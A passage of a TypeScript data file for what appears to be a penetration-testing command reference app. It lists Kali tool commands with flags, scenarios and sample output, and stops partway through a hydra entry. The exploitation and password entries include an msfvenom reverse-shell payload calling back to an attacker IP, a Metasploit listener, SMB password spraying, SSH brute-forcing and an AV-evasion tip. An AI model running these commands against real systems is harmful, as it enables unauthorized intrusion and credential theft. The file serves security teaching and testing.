import type { CategoryMeta, CommandItem } from '../types';

export const CATEGORIES: CategoryMeta[] = [
  {
    id: 'osint',
    name: 'Information Gathering & OSINT',
    shortName: 'OSINT & Recon',
    description: 'Passive and active reconnaissance to map domains, subdomains, emails, and target footprint.',
    iconName: 'Search',
    color: 'from-blue-500 to-cyan-500',
    borderColor: 'border-cyan-500/30',
    badgeBg: 'bg-cyan-500/10 text-cyan-400 border-cyan-500/20'
  },
  {
    id: 'scanning',
    name: 'Network & Port Scanning',
    shortName: 'Port Scanning',
    description: 'Host discovery, port scanning, service fingerprinting, and firewall evasion.',
    iconName: 'Radar',
    color: 'from-emerald-500 to-teal-500',
    borderColor: 'border-emerald-500/30',
    badgeBg: 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20'
  },
  {
    id: 'web',
    name: 'Web Application Pentesting',
    shortName: 'Web Pentest',
    description: 'Fuzzing directories, discovering SQLi, XSS, CMS vulnerabilities, and server misconfigurations.',
    iconName: 'Globe',
    color: 'from-amber-500 to-orange-500',
    borderColor: 'border-amber-500/30',
    badgeBg: 'bg-amber-500/10 text-amber-400 border-amber-500/20'
  },
  {
    id: 'exploitation',
    name: 'Exploitation & Weaponization',
    shortName: 'Exploitation',
    description: 'Weaponized payloads, Metasploit handlers, exploit database queries, and active directory spray.',
    iconName: 'Zap',
    color: 'from-red-500 to-rose-500',
    borderColor: 'border-red-500/30',
    badgeBg: 'bg-red-500/10 text-red-400 border-red-500/20'
  },
  {
    id: 'password',
    name: 'Password Attacks & Cracking',
    shortName: 'Password Attacks',
    description: 'Online brute-forcing, dictionary generation, offline hash cracking with CPU and GPU acceleration.',
    iconName: 'KeyRound',
    color: 'from-purple-500 to-pink-500',
    borderColor: 'border-purple-500/30',
    badgeBg: 'bg-purple-500/10 text-purple-400 border-purple-500/20'
  },
  {
    id: 'wireless',
    name: 'Wireless & RF Attacks',
    shortName: 'Wireless Attacks',
    description: 'Monitor mode, deauthentication attacks, 4-way handshake capture, and WPA/WPA2 cracking.',
    iconName: 'Wifi',
    color: 'from-sky-500 to-indigo-500',
    borderColor: 'border-sky-500/30',
    badgeBg: 'bg-sky-500/10 text-sky-400 border-sky-500/20'
  },
  {
    id: 'privesc',
    name: 'Privilege Escalation & Post-Exploit',
    shortName: 'PrivEsc & Post-Exploit',
    description: 'Local enumeration, credential harvesting, SUID hunting, and internal pivoting.',
    iconName: 'ShieldAlert',
    color: 'from-violet-500 to-purple-600',
    borderColor: 'border-violet-500/30',
    badgeBg: 'bg-violet-500/10 text-violet-400 border-violet-500/20'
  },
  {
    id: 'forensics',
    name: 'Digital Forensics & Reverse Engineering',
    shortName: 'Forensics & Reversing',
    description: 'Memory analysis, binary disassembling, firmware extraction, and metadata inspection.',
    iconName: 'Microscope',
    color: 'from-teal-500 to-cyan-600',
    borderColor: 'border-teal-500/30',
    badgeBg: 'bg-teal-500/10 text-teal-400 border-teal-500/20'
  },
  {
    id: 'pivoting',
    name: 'Network Pivoting & Sniffing',
    shortName: 'Pivoting & Sniffing',
    description: 'Traffic capture, port redirection, raw socket connections, and tunnel creation.',
    iconName: 'Network',
    color: 'from-blue-600 to-indigo-600',
    borderColor: 'border-indigo-500/30',
    badgeBg: 'bg-indigo-500/10 text-indigo-400 border-indigo-500/20'
  }
];

export const COMMANDS_DATA: CommandItem[] = [
  // --- OSINT ---
  {
    id: 'osint-1',
    name: 'theHarvester Domain OSINT',
    tool: 'theHarvester',
    category: 'osint',
    description: 'Gathers emails, employee names, subdomains, IPs, and open ports from public search engines and PGP key servers.',
    command: 'theHarvester -d target.com -b all -l 500',
    flags: [
      { flag: '-d target.com', description: 'Specifies the target company domain name' },
      { flag: '-b all', description: 'Use all available data sources (Google, Bing, Shodan, DuckDuckGo, Yahoo, etc.)' },
      { flag: '-l 500', description: 'Limit search results to 500 records per search engine' }
    ],
    scenario: 'Used during passive reconnaissance to build an initial target profile, find staff emails for spear-phishing simulation, and uncover forgotten subdomains without touching target servers.',
    noiseLevel: 'stealth',
    phase: 'Reconnaissance',
    mitreId: 'T1593 / T1589',
    outputExample: `[*] Target: target.com
[*] Searching Bing...
[*] Searching Google...
[*] Searching Shodan...
[*] Emails found: 14
    admin@target.com
    hr@target.com
    dev-team@target.com
[*] Hosts found: 8
    vpn.target.com: 198.51.100.12
    mail.target.com: 198.51.100.15
    portal.target.com: 198.51.100.22`,
    tips: 'Use API keys in api-keys.yaml (Shodan, Hunter.io) for exponentially richer intelligence.'
  },
  {
    id: 'osint-2',
    name: 'whois Domain & IP Registration Lookup',
    tool: 'whois',
    category: 'osint',
    description: 'Queries domain registrars and Regional Internet Registries (RIRs) for ownership, DNS records, and netblocks.',
    command: 'whois target.com',
    flags: [
      { flag: 'target.com', description: 'Domain name or IP address to query against WHOIS databases' }
    ],
    scenario: 'Step 1 of an external penetration test to identify the registrar, administrative contacts, DNS name servers, and assigned CIDR IP blocks.',
    noiseLevel: 'stealth',
    phase: 'Reconnaissance',
    mitreId: 'T1596.002',
    outputExample: `Domain Name: TARGET.COM
Registry Domain ID: 2138941_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.markmonitor.com
Registrar: MarkMonitor Inc.
Name Server: NS1.TARGET.COM
Name Server: NS2.TARGET.COM
Registrant Organization: Target Corp Security
Registrant State/Province: CA`,
    tips: 'Can also be run against an IP address (e.g. whois 198.51.100.12) to reveal the ISP netblock and autonomous system (ASN).'
  },
  {
    id: 'osint-3',
    name: 'dnsrecon Comprehensive DNS Enumerator',
    tool: 'dnsrecon',
    category: 'osint',
    description: 'Performs DNS zone transfers, PTR record lookups, SRV record enumeration, and dictionary-based subdomain brute-forcing.',
    command: 'dnsrecon -d target.com -t std,brt -D /usr/share/wordlists/dnsmap.txt',
    flags: [
      { flag: '-d target.com', description: 'Target domain to interrogate' },
      { flag: '-t std,brt', description: 'Run standard enumeration (NS, SOA, MX, A) and dictionary brute-force' },
      { flag: '-D <file>', description: 'Dictionary wordlist file containing subdomains to check' }
    ],
    scenario: 'Identifies hidden staging environments, internal DNS servers, mail exchanges, and checks for catastrophic DNS Zone Transfers (AXFR).',
    noiseLevel: 'low',
    phase: 'Reconnaissance',
    mitreId: 'T1590.002',
    outputExample: `[*] Performing General Enumeration of : target.com
[*] DNSSEC is not configured
[*] A target.com 198.51.100.10
[*] MX mail.target.com 198.51.100.15
[*] NS ns1.target.com 198.51.100.2
[*] Checking for Zone Transfer for target.com...
[-] Zone Transfer Failed (AXFR refused)
[*] Brute-forcing subdomains with dnsmap.txt...
[*] A staging.target.com 198.51.100.45
[*] A dev.target.com 198.51.100.46`,
    tips: 'Always check if AXFR zone transfer succeeds — if it does, the entire internal DNS map is exposed in seconds.'
  },
  {
    id: 'osint-4',
    name: 'amass Active & Passive Subdomain Intelligence',
    tool: 'amass',
    category: 'osint',
    description: 'OWASP Amass performs in-depth network mapping and attack surface discovery using open source information and active DNS resolution.',
    command: 'amass enum -d target.com -active -brute -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt',
    flags: [
      { flag: 'enum', description: 'Run DNS enumeration mode' },
      { flag: '-d target.com', description: 'Target root domain' },
      { flag: '-active', description: 'Attempt active certificate pulls and DNS zone checks' },
      { flag: '-brute', description: 'Execute brute-force DNS resolution' },
      { flag: '-w <path>', description: 'Path to subdomain wordlist' }
    ],
    scenario: 'Used by Red Teams and Bug Bounty hunters to map massive corporate external attack surfaces across cloud infrastructures (AWS, Azure, GCP).',
    noiseLevel: 'moderate',
    phase: 'Reconnaissance',
    mitreId: 'T1596',
    outputExample: `[Amass] Starting enumeration for target.com...
api.target.com (FQDN) --> a.target.com (CNAME) --> 198.51.100.80
auth.target.com (FQDN) --> 198.51.100.81
k8s-ingress.target.com (FQDN) --> 198.51.100.99
[Amass] Completed: 142 unique subdomains discovered across 4 ASNs.`,
    tips: 'Pipe to jq or amass track to detect newly spawned corporate subdomains over time.'
  },
  {
    id: 'osint-5',
    name: 'sublist3r Multi-Engine Subdomain Finder',
    tool: 'sublist3r',
    category: 'osint',
    description: 'Fast Python-based subdomain enumeration tool that scrapes search engines like Baidu, Yahoo, Google, Bing, and Netcraft.',
    command: 'sublist3r -d target.com -t 50 -v -o subdomains.txt',
    flags: [
      { flag: '-d target.com', description: 'Target domain' },
      { flag: '-t 50', description: 'Number of concurrent threads (50 for high speed)' },
      { flag: '-v', description: 'Enable verbose real-time output' },
      { flag: '-o subdomains.txt', description: 'Save discovered subdomains to a text file' }
    ],
    scenario: 'Quick, zero-setup passive reconnaissance when you need a fast list of subdomains in under 60 seconds.',
    noiseLevel: 'stealth',
    phase: 'Reconnaissance',
    mitreId: 'T1596.001',
    outputExample: `[-] Searching in Google...
[-] Searching in Bing...
[-] Searching in Virustotal...
[-] Total Unique Subdomains Found: 38
api.target.com
gitlab.target.com
vpn.target.com`,
    tips: 'Combine with httpx in Kali to instantly filter for live HTTP/HTTPS endpoints.'
  },

  // --- SCANNING ---
  {
    id: 'scan-1',
    name: 'nmap Full Comprehensive Port & Service Scan',
    tool: 'nmap',
    category: 'scanning',
    description: 'The golden standard of penetration testing: scans all 65,535 TCP ports with version detection, default safe NSE scripts, and multi-format output.',
    command: 'nmap -sC -sV -p- -T4 -oA full_scan_target 192.168.1.50',
    flags: [
      { flag: '-sC', description: 'Run default safe Nmap Scripting Engine (NSE) scripts' },
      { flag: '-sV', description: 'Probe open ports to determine service name and exact version' },
      { flag: '-p-', description: 'Scan all 65,535 TCP ports (1 to 65535)' },
      { flag: '-T4', description: 'Aggressive timing template for faster execution on modern networks' },
      { flag: '-oA <prefix>', description: 'Output results in three formats: normal (.nmap), XML (.xml), and grepable (.gnmap)' }
    ],
    scenario: 'Essential host enumeration during infrastructure pentesting to find non-standard ports (e.g., SSH on 2222, Tomcat on 8080, MySQL on 3306).',
    noiseLevel: 'noisy',
    phase: 'Discovery',
    mitreId: 'T1046',
    outputExample: `Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 192.168.1.50
Host is up (0.0012s latency).
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
80/tcp   open  http        Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Corporate Portal
3306/tcp open  mysql       MySQL 8.0.35-0ubuntu0.22.04.1
8080/tcp open  http-proxy  Apache Tomcat 9.0.58
MAC Address: 00:0C:29:4F:8A:12 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`,
    tips: 'If the host blocks ping probes (ICMP), add the -Pn flag to skip host discovery.'
  },
  {
    id: 'scan-2',
    name: 'nmap Stealth SYN Top Ports Scan',
    tool: 'nmap',
    category: 'scanning',
    description: 'High-speed half-open SYN scan across the top 1000 most common ports without completing TCP 3-way handshakes, avoiding simple connection logs.',
    command: 'nmap -sS -Pn -n --top-ports 1000 -T4 target.com',
    flags: [
      { flag: '-sS', description: 'TCP SYN Stealth scan (half-open, sends SYN, waits for SYN-ACK, responds with RST)' },
      { flag: '-Pn', description: 'Treat all hosts as online (skip ICMP echo ping probe)' },
      { flag: '-n', description: 'Never do reverse DNS resolution (improves scan speed and avoids DNS logs)' },
      { flag: '--top-ports 1000', description: 'Scan the 1000 most common ports identified by Nmap statistics' },
      { flag: '-T4', description: 'Timing template 4 (faster)' }
    ],
    scenario: 'Used when stealth or speed is needed against a hardened firewall or when performing initial perimeter scans against thousands of hosts.',
    noiseLevel: 'moderate',
    phase: 'Discovery',
    mitreId: 'T1046',
    outputExample: `Nmap scan report for target.com (198.51.100.10)
Host is up (0.024s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3389/tcp open  ms-wbt-server
8443/tcp open  https-alt`,
    tips: 'Requires sudo/root privileges because raw socket creation is necessary for crafting raw TCP SYN packets.'
  },
  {
    id: 'scan-3',
    name: 'nmap UDP Service Scan',
    tool: 'nmap',
    category: 'scanning',
    description: 'Scans UDP ports to locate commonly neglected services such as SNMP, DNS, NTP, TFTP, and DHCP.',
    command: 'nmap -sU --top-ports 100 -sV -T4 192.168.1.50',
    flags: [
      { flag: '-sU', description: 'Activate UDP port scanning mode' },
      { flag: '--top-ports 100', description: 'Scan the top 100 UDP ports (UDP scanning is inherently slow due to OS rate limiting)' },
      { flag: '-sV', description: 'Probe UDP services to fingerprint exact version numbers' }
    ],
    scenario: 'Uncovering unprotected SNMP services (port 161) with public community strings, open DNS resolvers (port 53), or vulnerable NTP servers.',
    noiseLevel: 'moderate',
    phase: 'Discovery',
    mitreId: 'T1046',
    outputExample: `PORT    STATE         SERVICE VERSION
53/udp  open          domain  ISC BIND 9.18.1
123/udp open          ntp     NTP v4
161/udp open|filtered snmp
|_snmp-info: SNMPv2-SMI::mib-2.1.1.0 = STRING: "Edge-Router-01"`,
    tips: 'Combine with --script snmp-brute or snmp-info if port 161 is open to dump routing tables and interfaces.'
  },
  {
    id: 'scan-4',
    name: 'nmap Automated NSE Vulnerability Scan',
    tool: 'nmap',
    category: 'scanning',
    description: 'Executes the Nmap Scripting Engine vuln category scripts to automatically test known CVEs and security flaws on target ports.',
    command: 'nmap -sV --script=vuln -T4 192.168.1.50',
    flags: [
      { flag: '-sV', description: 'Service and version detection required for NSE scripts to match vulnerabilities' },
      { flag: '--script=vuln', description: 'Execute all scripts in the vulnerability category (detects EternalBlue, Log4j, Heartbleed, etc.)' }
    ],
    scenario: 'Fast vulnerability triage during time-constrained internal network assessments to find low-hanging critical vulnerabilities.',
    noiseLevel: 'noisy',
    phase: 'Discovery',
    mitreId: 'T1595.002',
    outputExample: `PORT    STATE SERVICE VERSION
445/tcp open  smb     Windows Server 2008 R2
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH`,
    tips: 'Use --script-args unsafe=1 only in authorized lab tests as some vuln scripts can crash legacy target services.'
  },
  {
    id: 'scan-5',
    name: 'masscan High-Speed Internet Port Scanner',
    tool: 'masscan',
    category: 'scanning',
    description: 'Massive-scale asynchronous TCP port scanner capable of scanning the entire Internet in under 5 minutes at 10 million packets per second.',
    command: 'masscan -p1-65535 192.168.1.0/24 --rate=10000 --banners -e eth0',
    flags: [
      { flag: '-p1-65535', description: 'Scan every single port from 1 to 65535' },
      { flag: '192.168.1.0/24', description: 'Target CIDR subnet' },
      { flag: '--rate=10000', description: 'Transmit 10,000 packets per second' },
      { flag: '--banners', description: 'Capture service banners upon port handshake' },
      { flag: '-e eth0', description: 'Network interface to transmit raw packets through' }
    ],
    scenario: 'Scouting large corporate class B or C networks (/16 or /24) in seconds to identify live services before deep Nmap profiling.',
    noiseLevel: 'noisy',
    phase: 'Discovery',
    mitreId: 'T1046',
    outputExample: `Discovered open port 80/tcp on 192.168.1.20
Discovered open port 443/tcp on 192.168.1.20
Discovered open port 22/tcp on 192.168.1.34
Discovered open port 3389/tcp on 192.168.1.99
[banner] 192.168.1.20:80: HTTP/1.1 200 OK Server: nginx/1.18.0`,
    tips: 'Masscan is asynchronous and does not maintain state. Always follow up open ports with Nmap for precise versioning.'
  },
  {
    id: 'scan-6',
    name: 'netdiscover Active & Passive ARP Scanner',
    tool: 'netdiscover',
    category: 'scanning',
    description: 'Active/passive ARP reconnaissance tool used to discover internal IPv4 hosts on local networks without generating routing noise.',
    command: 'netdiscover -r 192.168.1.0/24 -i eth0',
    flags: [
      { flag: '-r 192.168.1.0/24', description: 'Subnet range to scan via ARP requests' },
      { flag: '-i eth0', description: 'Network interface to use' }
    ],
    scenario: 'Plugging into an unknown local physical switch or Wi-Fi network during an on-site engagement to locate printers, gateway routers, and workstations.',
    noiseLevel: 'moderate',
    phase: 'Discovery',
    mitreId: 'T1018',
    outputExample: `Currently scanning: 192.168.1.0/24   |   Screen View: Unique Hosts
3 Captured ARP Req/Rep packets, from 3 hosts. Total size: 180
_____________________________________________________________________________
  IP            At MAC Address     Count Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
 192.168.1.1    00:50:56:c0:00:08      1   60  VMware, Inc.
 192.168.1.10   b8:27:eb:12:34:56      1   60  Raspberry Pi Foundation
 192.168.1.50   00:0c:29:4f:8a:12      1   60  VMware, Inc.`,
    tips: 'Use -p flag for passive mode to passively sniff ARP broadcasts without transmitting a single packet.'
  },

  // --- WEB APP PENTESTING ---
  {
    id: 'web-1',
    name: 'sqlmap Automated SQL Injection & DB Extraction',
    tool: 'sqlmap',
    category: 'web',
    description: 'Automated tool that detects and exploits SQL injection flaws, dumps backend databases, extracts password hashes, and accesses the underlying OS.',
    command: 'sqlmap -u "https://target.com/vuln.php?id=1" --batch --dbs --random-agent',
    flags: [
      { flag: '-u "<url>"', description: 'Target URL containing injectable parameters' },
      { flag: '--batch', description: 'Never ask for user input; accept all default answers automatically' },
      { flag: '--dbs', description: 'Enumerate and dump all DBMS database names' },
      { flag: '--random-agent', description: 'Use randomly selected HTTP User-Agent header from dictionary to bypass simple filters' }
    ],
    scenario: 'Confirming suspected SQLi in a web application parameter, determining the database engine (MySQL, PostgreSQL, MSSQL, Oracle), and extracting data.',
    noiseLevel: 'noisy',
    phase: 'Exploitation',
    mitreId: 'T1190',
    outputExample: `[+] GET parameter 'id' is vulnerable to:
    - Boolean-based blind SQL injection
    - Error-based SQL injection
    - UNION query SQL injection
back-end DBMS: MySQL >= 8.0.0
available databases [4]:
[*] information_schema
[*] mysql
[*] production_db
[*] user_management`,
    tips: 'Add --os-shell to attempt gaining an interactive operating system command shell if database user has FILE privileges.'
  },
  {
    id: 'web-2',
    name: 'nikto Web Server Vulnerability Scanner',
    tool: 'nikto',
    category: 'web',
    description: 'Comprehensive web server scanner that tests for over 6,700 potentially dangerous files, outdated server software, and misconfigurations.',
    command: 'nikto -h https://target.com -ssl -Tuning 1,2,3,b',
    flags: [
      { flag: '-h https://target.com', description: 'Target host or URL to audit' },
      { flag: '-ssl', description: 'Force SSL/TLS connection on port 443' },
      { flag: '-Tuning 1,2,3,b', description: 'Test for interesting files, misconfigurations, information disclosure, and software identification' }
    ],
    scenario: 'Running an initial baseline vulnerability assessment against web servers to catch old backup files (.bak, .sql), enabled HTTP TRACE methods, and exposed admin panels.',
    noiseLevel: 'noisy',
    phase: 'Reconnaissance',
    mitreId: 'T1595.002',
    outputExample: `- Nikto v2.5.0
+ Target Host: target.com
+ Target Port: 443
+ Server: Apache/2.4.41 (Ubuntu)
+ [CVE-2019-0211] Apache version is vulnerable to privilege escalation.
+ The anti-clickjacking X-Frame-Options header is not present.
+ Cookie session_id created without the httponly flag.
+ /phpinfo.php: Output from the phpinfo() function found.
+ /admin.bak: Backup file found containing database credentials.`,
    tips: 'Nikto generates many web server log entries. Use -evasion 1 to employ simple IDS evasion techniques.'
  },
  {
    id: 'web-3',
    name: 'gobuster Directory & File Brute-Forcing',
    tool: 'gobuster',
    category: 'web',
    description: 'High-speed directory, file, and virtual host brute-forcer written in Go, significantly faster than legacy Python tools.',
    command: 'gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,json -t 50',
    flags: [
      { flag: 'dir', description: 'Directory brute-forcing mode' },
      { flag: '-u https://target.com', description: 'Target web application base URL' },
      { flag: '-w <wordlist>', description: 'Path to wordlist file' },
      { flag: '-x php,html,txt,json', description: 'File extensions to append to each wordlist item' },
      { flag: '-t 50', description: '50 concurrent goroutine threads' }
    ],
    scenario: 'Discovering unlinked hidden administrative directories, sensitive API endpoints, Swagger docs, and forgotten deployment artifacts.',
    noiseLevel: 'moderate',
    phase: 'Discovery',
    mitreId: 'T1083',
    outputExample: `===============================================================
Gobuster v3.6
[+] Url:                     https://target.com
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Extensions:              php,html,txt,json
===============================================================
/admin                (Status: 301) [Size: 194] [--> /admin/]
/api                  (Status: 200) [Size: 842]
/config.php.bak       (Status: 200) [Size: 1045]
/robots.txt           (Status: 200) [Size: 82]
/swagger.json         (Status: 200) [Size: 14200]`,
    tips: 'Use gobuster vhost -u https://target.com -w vhosts.txt to discover hidden Virtual Hosts sharing the same IP.'
  },
  {
    id: 'web-4',
    name: 'ffuf High-Performance Web Fuzzer',
    tool: 'ffuf',
    category: 'web',
    description: 'Fast web fuzzer written in Go. Flexible fuzzing across URL paths, parameters, POST bodies, and HTTP headers using the FUZZ keyword.',
    command: 'ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302 -c -v',
    flags: [
      { flag: '-u https://target.com/FUZZ', description: 'Target URL with FUZZ placeholder for payload insertion' },
      { flag: '-w <wordlist>', description: 'Wordlist dictionary to iterate through' },
      { flag: '-mc 200,301,302', description: 'Match only specific HTTP response status codes' },
      { flag: '-c', description: 'Colorize console output for readability' },
      { flag: '-v', description: 'Verbose output showing redirect locations and response lengths' }
    ],
    scenario: 'Fuzzing for hidden parameters (e.g. ?FUZZ=test), API route discovery, and bypass testing with custom HTTP headers.',
    noiseLevel: 'moderate',
    phase: 'Discovery',
    mitreId: 'T1083',
    outputExample: `[Status: 200, Size: 4521, Words: 382, Lines: 112]
    * FUZZ: dashboard
[Status: 301, Size: 178, Words: 8, Lines: 4]
    * FUZZ: internal -> https://target.com/internal/
[Status: 200, Size: 924, Words: 42, Lines: 12]
    * FUZZ: metrics`,
    tips: 'Use -fs (filter size) or -fw (filter words) to eliminate false positives from custom 404 pages.'
  },
  {
    id: 'web-5',
    name: 'wpscan WordPress Security Scanner',
    tool: 'wpscan',
    category: 'web',
    description: 'Black box WordPress vulnerability scanner that identifies vulnerable plugins, themes, core versions, and enumerates usernames.',
    command: 'wpscan --url https://target.com --enumerate u,vp,vt --random-user-agent',
    flags: [
      { flag: '--url https://target.com', description: 'Target WordPress website URL' },
      { flag: '--enumerate u,vp,vt', description: 'Enumerate Users (u), Vulnerable Plugins (vp), and Vulnerable Themes (vt)' },
      { flag: '--random-user-agent', description: 'Use random User-Agent header' }
    ],
    scenario: 'Identifying outdated WordPress plugins with known Remote Code Execution (RCE) flaws and enumerating valid usernames for password attacks.',
    noiseLevel: 'moderate',
    phase: 'Discovery',
    mitreId: 'T1595.002',
    outputExample: `[+] WordPress version 6.2 identified
[+] Enumerating Vulnerable Plugins:
[!] Title: Elementor <= 3.6.2 - Stored Cross-Site Scripting (XSS)
    Fixed in: 3.6.3
    References: CVE-2022-1329
[+] Enumerating Users:
[i] User ID: 1, Name: admin
[i] User ID: 2, Name: editor_john`,
    tips: 'Get a free WPScan API token from wpscan.com and supply --api-token to check against the real-time vulnerability database.'
  },
  {
    id: 'web-6',
    name: 'commix Automated OS Command Injection',
    tool: 'commix',
    category: 'web',
    description: 'Automated command injection exploitation tool that detects and exploits command injection vulnerabilities in web applications.',
    command: 'commix --url="http://target.com/status.php?addr=127.0.0.1" --batch',
    flags: [
      { flag: '--url="<url>"', description: 'Target URL with parameter to test for command injection' },
      { flag: '--batch', description: 'Non-interactive mode; accepts default options automatically' }
    ],
    scenario: 'Testing web forms that execute system commands (such as network ping/traceroute diagnostic tools) for arbitrary OS command execution.',
    noiseLevel: 'noisy',
    phase: 'Exploitation',
    mitreId: 'T1059',
    outputExample: `[+] Parameter 'addr' is vulnerable to:
    - Classic OS Command Injection
    - Blind OS Command Injection (Time-based)
[+] Operating System: Linux (Debian 11)
[+] Current User: www-data
commix(os_shell) > whoami
www-data`,
    tips: 'Commix can automatically spawn a reverse shell or meterpreter session upon successful injection.'
  },

  // --- EXPLOITATION ---
  {
    id: 'exploit-1',
    name: 'msfconsole Metasploit Framework Multi-Handler',
    tool: 'msfconsole',
    category: 'exploitation',
    description: 'Launches the Metasploit console and arms the multi/handler listener to catch incoming reverse shells and Meterpreter sessions.',
    command: 'msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST eth0; set LPORT 4444; run"',
    flags: [
      { flag: '-q', description: 'Quiet mode; suppresses banner for faster startup' },
      { flag: '-x "<commands>"', description: 'Execute console commands immediately upon launch' },
      { flag: 'set payload <payload>', description: 'Specify matching payload architecture (Linux x64 reverse TCP)' },
      { flag: 'set LHOST <ip/iface>', description: 'Local IP address or interface to listen on' },
      { flag: 'set LPORT 4444', description: 'Local listening port' }
    ],
    scenario: 'Standard command to prepare your listener before executing a staged payload or exploit on the target system.',
    noiseLevel: 'low',
    phase: 'Exploitation',
    mitreId: 'T1059',
    outputExample: `[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] Sending stage (3045380 bytes) to 192.168.1.50
[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 192.168.1.50:54321) at 2026-09-19
meterpreter > sysinfo
OS: Linux 5.15.0-88-generic #98-Ubuntu SMP (x86_64)`,
    tips: 'Use set ExitOnSession false if expecting multiple reverse connections from multiple targets.'
  },
  {
    id: 'exploit-2',
    name: 'msfvenom Reverse Shell Payload Generator',
    tool: 'msfvenom',
    category: 'exploitation',
    description: 'Combines payload generation and encoding to craft standalone shellcode, executables, WAR, ELF, and DLL payloads.',
    command: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o payload.exe',
    flags: [
      { flag: '-p windows/x64/meterpreter/reverse_tcp', description: 'Specifies the staged Windows x64 Meterpreter reverse TCP payload' },
      { flag: 'LHOST=10.10.14.5', description: 'Attacker IP to which the compromised host connects back' },
      { flag: 'LPORT=4444', description: 'Attacker port listening for the connection' },
      { flag: '-f exe', description: 'Output format (exe, elf, raw, war, asp, powershell, python)' },
      { flag: '-o payload.exe', description: 'Output file destination' }
    ],
    scenario: 'Generating client-side execution payloads for penetration testing engagements, phishing simulations, or initial access tests.',
    noiseLevel: 'noisy',
    phase: 'Weaponization',
    mitreId: 'T1059.001',
    outputExample: `[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: payload.exe`,
    tips: 'Use -e x86/shikata_ga_nai -i 5 for polymorphic encoding, or use custom loaders for AV/EDR evasion.'
  },
  {
    id: 'exploit-3',
    name: 'searchsploit Offline Exploit-DB Search',
    tool: 'searchsploit',
    category: 'exploitation',
    description: 'Command line search utility for Exploit-DB that lets you take an entire copy of Exploit-DB with you offline.',
    command: 'searchsploit "Apache 2.4.49" --colour -w',
    flags: [
      { flag: '"Apache 2.4.49"', description: 'Search keywords (software name, version, or CVE)' },
      { flag: '--colour', description: 'Highlight matching terms in console output' },
      { flag: '-w', description: 'Show URL to exploit-db.com in the search results' }
    ],
    scenario: 'Searching for existing public proof-of-concept (PoC) exploits for services discovered during port scanning without touching the internet.',
    noiseLevel: 'stealth',
    phase: 'Weaponization',
    mitreId: 'T1588.005',
    outputExample: `------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                    |  URL
------------------------------------------------------------------ ---------------------------------
 Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Executi | https://www.exploit-db.com/exploits/50383
 Apache HTTP Server 2.4.49 - Remote Code Execution (RCE) (cURL)   | https://www.exploit-db.com/exploits/50406
------------------------------------------------------------------ ---------------------------------`,
    tips: 'Run searchsploit -m 50383 to copy the exploit script directly into your current working directory.'
  },
  {
    id: 'exploit-4',
    name: 'netexec (nxc) Active Directory & SMB Attack Tool',
    tool: 'netexec',
    category: 'exploitation',
    description: 'Swiss army knife for pentesting Active Directory networks. Performs SMB password spraying, share enumeration, and command execution.',
    command: 'nxc smb 192.168.1.0/24 -u user.txt -p pass.txt --continue-on-success',
    flags: [
      { flag: 'smb', description: 'Protocol to target (smb, wmi, winrm, rdp, ldap, ssh)' },
      { flag: '192.168.1.0/24', description: 'Target network subnet' },
      { flag: '-u user.txt', description: 'Wordlist of usernames' },
      { flag: '-p pass.txt', description: 'Wordlist of passwords to spray' },
      { flag: '--continue-on-success', description: 'Keep checking all credentials even after finding a valid match' }
    ],
    scenario: 'Internal corporate network assessment to find weak domain passwords, locate accessible network shares, and check for local admin access (Pwn3d!).',
    noiseLevel: 'noisy',
    phase: 'Credential Access',
    mitreId: 'T1110.003',
    outputExample: `SMB  192.168.1.10  445  DC01  [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:CORP.LOCAL)
SMB  192.168.1.10  445  DC01  [-] CORP.LOCAL\\jsmith:Summer2023 STATUS_LOGON_FAILURE
SMB  192.168.1.25  445  FS01  [+] CORP.LOCAL\\backup_admin:Password123! (Pwn3d!)`,
    tips: 'When (Pwn3d!) appears, you have full local administrator privileges on that host and can dump SAM or LSA secrets.'
  },

  // --- PASSWORD ATTACKS ---
  {
    id: 'pwd-1',
    name: 'hydra Online SSH Login Brute-Forcer',
    tool: 'hydra',
    category: 'password',
    description: 'Very fast network logon cracker supporting SSH, FTP, Telnet, HTTP, SMB, RDP, MySQL, and over 50 other protocols.',
    command: 'hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.50 ssh -t 4 -V',
    flags: [
      { flag: '-l root', description: 'Single username to test (or use -L <file> for multiple)' },
      { flag: '-P /usr/share/wordlists/rockyou.txt', description: 'Path to password dictionary file' },
      { flag: 'ssh', description: 'Target service protocol' },
      { flag: '-t 4', description: 'Number of parallel connection tasks (keep low for SSH to avoid rate limits)' },
      { flag: '-V', description: 'Verbose mode: display each tested login attempt' }
    ],
    scenario: 'Auditing password strength on administrative services (SSH, FTP, Web portals) when default or weak credentials are suspected.',
    noiseLevel: 'noisy',
    phase: 'Credential Access',
    mitreId: 'T1110.001',
